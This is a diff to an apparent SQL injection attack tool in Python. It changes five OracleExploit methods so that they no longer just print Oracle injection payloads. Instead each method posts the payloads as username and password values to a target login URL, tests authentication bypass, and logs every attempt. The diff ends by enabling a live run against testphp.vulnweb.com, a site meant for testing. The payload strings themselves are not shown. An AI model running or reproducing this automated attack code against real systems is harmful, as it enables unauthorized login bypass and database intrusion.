@@ -8,6 +8,7 @@ from datetime import datetime
 import sys
 import os
 import logging
+import random
 
 current_directory = os.getcwd()
 
@@ -30,6 +31,9 @@ from lib.SQLJNGDataTypes.Magicdicts import magic_dict
 from lib.Attacktype.Attacks import HeaderAttacks
 from logger.sqljlog import logger as sqljlog
 from lib.OracleSQLinjection.oraclepayloads import OraclePayloads
+from lib.regelexpression.extractparameter import extract_parameter_name
+from INFO.common import columns
+from INFO.common import tables
 
 attack_type = "authentication bypass SQL injection"
 
@@ -73,13 +77,27 @@ headers = {
 class OracleExploit:
     @staticmethod 
     def Hostname_Attack(urls):
-        payload = OraclePayloads.Host_name_oracle("id","column","table")
+        parameter,_ = extract_parameter_name(urls)
+        payload = OraclePayloads.Host_name_oracle(viewcolumn=random.choice(columns),hostname=parameter,table=random.choice(tables))
         rows = payload.split("\n")
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
 
-        for payloads in sorted_payload.split("\n"):
-            print(payloads)
+        for Payloads in sorted_payload.split("\n"):
+            if Payloads == "":
+                continue
+            check = requests.get(urls)
+            if check.status_code == 200:
+                logger.info(f"Host:{urls}")
+                params = {
+                    "username":Payloads,
+                    "password":Payloads
+                }
+                attack = requests.post(url=urls,data=params)
+                sqljlog.info(f"Testing:{Payloads}")
+            
+            else:
+                logger.critical("Host is down.")
 
     
     @staticmethod
@@ -89,8 +107,21 @@ class OracleExploit:
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
 
-        for payloads in sorted_payload.split("\n"):
-            print(payloads)
+        for Payloads in sorted_payload.split("\n"):
+            if Payloads == "":
+                continue
+            check = requests.get(urls)
+            if check.status_code == 200:
+                logger.info(f"Host:{urls}")
+                params = {
+                    "username":Payloads,
+                    "password":Payloads
+                }
+                attack = requests.post(url=urls,data=params)
+                sqljlog.info(f"Testing:{Payloads}")
+            
+            else:
+                logger.critical("Host is down.")
 
     @staticmethod 
     def db_column_list_exploit(urls):
@@ -99,8 +130,21 @@ class OracleExploit:
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
 
-        for payloads in sorted_payload.split("\n"):
-            print(payloads)
+        for Payloads in sorted_payload.split("\n"):
+            if Payloads == "":
+                continue
+            check = requests.get(urls)
+            if check.status_code == 200:
+                logger.info(f"Host:{urls}")
+                params = {
+                    "username":Payloads,
+                    "password":Payloads
+                }
+                attack = requests.post(url=urls,data=params)
+                sqljlog.info(f"Testing:{Payloads}")
+            
+            else:
+                logger.critical("Host is down.")
 
     @staticmethod
     def oracle_injection_exploit(urls):
@@ -109,8 +153,21 @@ class OracleExploit:
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
 
-        for payloads in sorted_payload.split("\n"):
-            print(payloads)
+        for Payloads in sorted_payload.split("\n"):
+            if Payloads == "":
+                continue
+            check = requests.get(urls)
+            if check.status_code == 200:
+                logger.info(f"Host:{urls}")
+                params = {
+                    "username":Payloads,
+                    "password":Payloads
+                }
+                attack = requests.post(url=urls,data=params)
+                sqljlog.info(f"Testing:{Payloads}")
+            
+            else:
+                logger.critical("Host is down.")
 
     @staticmethod
     def oracle_injection_database_list_attack(urls):
@@ -119,8 +176,21 @@ class OracleExploit:
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
 
-        for payloads in sorted_payload.split("\n"):
-            print(payloads)
+        for Payloads in sorted_payload.split("\n"):
+            if Payloads == "":
+                continue
+            check = requests.get(urls)
+            if check.status_code == 200:
+                logger.info(f"Host:{urls}")
+                params = {
+                    "username":Payloads,
+                    "password":Payloads
+                }
+                attack = requests.post(url=urls,data=params)
+                sqljlog.info(f"Testing:{Payloads}")
+            
+            else:
+                logger.critical("Host is down.")
 
 
-# OracleExploit.Hostname_Attack("h")
+OracleExploit.Hostname_Attack("http://testphp.vulnweb.com/artists.php?artist=1")
